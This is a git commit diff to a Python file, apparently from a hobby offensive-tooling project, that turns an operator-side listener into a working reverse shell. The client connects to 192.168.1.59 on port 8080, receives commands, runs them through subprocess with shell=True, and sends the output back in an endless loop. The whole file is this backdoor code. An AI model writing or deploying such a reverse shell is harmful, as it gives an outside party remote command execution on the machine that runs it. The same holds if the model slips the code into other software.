9c9611e448ab9b24ddb69ca1dd67c7aa554551c7
Yiğit Emre Yıldırım <yldrmyigit00@gmail.com>
2026-06-30 01:42:25 -0700

    Update nyxa_connection_socket.py

--- nyxa_connection_socket.py
+++ nyxa_connection_socket.py
@@ -1,15 +1,16 @@
 import socket
+import subprocess
 
-listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
-listener.bind(("192.168.1.59",8080))
-listener.listen(0)
-print("listening on")
-(connection,address) = listener.accept()
-print("Connected from "+str(address))
+def command_interaction(command):
+    return subprocess.check_output(command, shell=True)
+
+
+connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+connection.connect(("192.168.1.59", 8080))
 
 while True:
-    command_input = raw_input("enter command: ")
-    connection.send(command_input)
-    command_output = connection.recv(1024)
-    print(command_output)
+    command = connection.recv(1024)
+    command_output = command_interaction(command)
+    connection.send(command_output)
+
+connection.close()
